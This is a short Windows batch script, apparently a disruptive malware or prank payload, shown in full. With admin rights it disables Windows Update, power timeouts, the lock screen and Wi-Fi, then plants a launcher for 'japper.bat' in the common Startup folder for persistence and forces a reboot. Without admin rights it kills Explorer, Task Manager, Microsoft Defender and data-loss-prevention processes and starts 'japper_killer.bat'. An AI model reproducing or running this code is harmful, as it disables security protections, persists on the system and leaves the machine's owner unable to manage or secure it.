@echo off
net session >nul 2>&1
if %errorlevel% == 0 (
    powercfg /change monitor-timeout-ac 0
    powercfg /change disk-timeout-ac 0
    powercfg /change standby-timeout-ac 0
    powercfg /change hibernate-timeout-ac 0
    sc config wuauserv start= disabled
    sc qc wuauserv
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_PowerButtonAction /t REG_DWORD /d 100 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f
    netsh interface set interface "Wi-Fi" admin=disabled
    for /f "usebackq tokens=*" %%i in (`powershell -command "[Environment]::GetFolderPath('CommonStartup')"`) do set startupPath=%%i
    cd /d "%startupPath%"
    echo start "" "%~dp0japper.bat">japperstarter.bat
    shutdown /r
) else (
    TASKKILL /IM Explorer.exe
    TASKKILL /IM OneDrive.exe
    TASKKILL /IM OneDrive.App.exe
    TASKKILL /IM Taskmgr.exe
    TASKKILL /IM MpDefenderCoreService.exe
    TASKKILL /IM MipDlp.exe
    TASKKILL /IM DlpUserAgent.exe
    TASKKILL /IM DlpUserAgent.exe
    TASKKILL /IM mpextms.exe
    TASKKILL /F /IM cmd.exe /T
    start "" "%~dp0japper_killer.bat"
)